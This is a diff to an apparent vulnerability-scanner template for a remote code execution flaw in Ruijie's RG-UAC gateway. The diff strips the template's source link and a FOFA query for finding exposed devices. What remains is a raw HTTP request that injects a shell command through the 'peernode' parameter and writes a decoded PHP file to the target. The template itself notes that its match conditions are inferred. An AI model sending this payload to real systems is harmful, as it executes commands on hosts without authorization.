@@ -3,14 +3,8 @@ info:
   name: 锐捷RG-UAC应用网关online_check.php前台RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/c8d239cbac554b70bd8cd16bb6e468dc
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: c8d239cbac554b70bd8cd16bb6e468dc
-    fofa: fofa：app="Ruijie-RG-UAC"
 http:
 - raw:
   - 'GET /view/vpn/autovpn/online_check.php?peernode=%20|%20`echo%20PD9waHAgZWNobyAxMTEqMTExOyB1bmxpbmsoX19GSUxFX18pOyA/Pg==%20|%20base64%20-d%20%3E%20test.php` HTTP/1.1
